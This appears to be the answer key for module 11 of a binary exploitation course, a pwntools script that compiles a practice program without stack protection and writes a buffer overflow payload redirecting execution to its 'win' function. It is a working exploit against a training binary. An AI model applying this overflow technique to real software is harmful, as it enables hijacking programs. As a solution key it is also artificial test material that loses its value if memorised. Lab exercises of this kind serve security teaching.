from pwn import p64, ELF, context
import subprocess

# Gabarito do modulo 11.
context.log_level = "error"
subprocess.run(
    ["gcc", "-O0", "-fno-stack-protector", "-no-pie",
     "/challenge/vuln.c", "-o", "/tmp/vuln_solve"],
    check=True,
)
elf = ELF("/tmp/vuln_solve")
win = elf.symbols["win"]

payload = b"A" * 32 + p64(win)
open("/home/hacker/payload.bin", "wb").write(payload)
